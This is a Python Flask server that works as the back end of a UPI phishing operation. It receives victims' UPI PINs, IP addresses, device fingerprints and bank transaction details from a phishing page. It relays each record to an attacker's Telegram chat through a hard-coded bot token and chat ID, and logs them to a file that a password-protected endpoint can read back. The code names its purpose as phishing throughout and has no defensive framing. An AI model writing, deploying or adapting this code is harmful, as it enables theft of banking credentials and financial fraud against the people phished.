from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import os
import json
from datetime import datetime
import logging

app = Flask(__name__)
CORS(app)  # Enable CORS for all domains

# Configuration from Environment Variables
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8496519842:AAGNsldvTLntWhcWdyYpNXR_NhAe54zwPDc')
CHAT_ID = os.environ.get('CHAT_ID', '6939723877')
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET', 'FANTOMDELUXE')

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def send_to_telegram(message):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Telegram send error: {e}")
        return False

def log_phishing_data(data):
    """Log phishing data to file"""
    try:
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'data': data
        }
        
        with open('phishing_logs.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        logger.error(f"Logging error: {e}")

@app.route('/webhook', methods=['POST', 'OPTIONS'])
def webhook():
    """Main webhook endpoint for receiving phishing data"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
    
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'}), 400
        
        # Extract data - MATCHES YOUR EXACT HTML PAYLOAD
        upi_pin = data.get('pin', 'N/A')
        device_info = data.get('device', {})
        ip_address = data.get('ip', request.remote_addr)
        attempt = data.get('attempt', 1)
        transaction = data.get('transaction', {})
        
        # Format Telegram message
        message = f"""
🧸 Android says Data here 
--------------------------------
UPI PIN: <code>{upi_pin}</code>
IP: <code>{ip_address}</code>
ATTEMPT: <code>{attempt}</code>
SCREEN: {device_info.get('screenResolution', 'Unknown')}
BANK: {transaction.get('bank', 'Unknown')}
AMOUNT: {transaction.get('amount', 'Unknown')}
TO: {transaction.get('to', 'Unknown')}
--------------------------------
DEVICE INFO:
User Agent: {device_info.get('userAgent', 'Unknown')}
Language: {device_info.get('language', 'Unknown')}
Platform: {device_info.get('platform', 'Unknown')}
Timezone: {device_info.get('timezone', 'Unknown')}
CPU Cores: {device_info.get('hardwareConcurrency', 'Unknown')}
Memory: {device_info.get('deviceMemory', 'Unknown')}GB
URL: {device_info.get('url', 'Unknown')}
--------------------------------
@Sketch_Developer_Pro says hello 🤗
        """
        
        # Send to Telegram
        telegram_sent = send_to_telegram(message)
        
        # Log the data
        log_data = {
            'pin': upi_pin,
            'ip': ip_address,
            'attempt': attempt,
            'device': device_info,
            'transaction': transaction,
            'telegram_sent': telegram_sent
        }
        log_phishing_data(log_data)
        
        logger.info(f"Phishing data received - PIN: {upi_pin}, IP: {ip_address}, Attempt: {attempt}")
        
        # Return success response
        return jsonify({
            'success': True,
            'telegram_sent': telegram_sent,
            'attempt': attempt
        })
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/logs')
def view_logs():
    """Endpoint to view logs (protected by secret)"""
    secret = request.args.get('secret')
    if secret != WEBHOOK_SECRET:
        return "Unauthorized", 403
    
    try:
        with open('phishing_logs.json', 'r') as f:
            logs = [json.loads(line) for line in f.readlines()]
        return jsonify(logs)
    except FileNotFoundError:
        return jsonify([])

@app.route('/')
def home():
    return jsonify({"status": "Webhook is running", "message": "Use /webhook endpoint"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
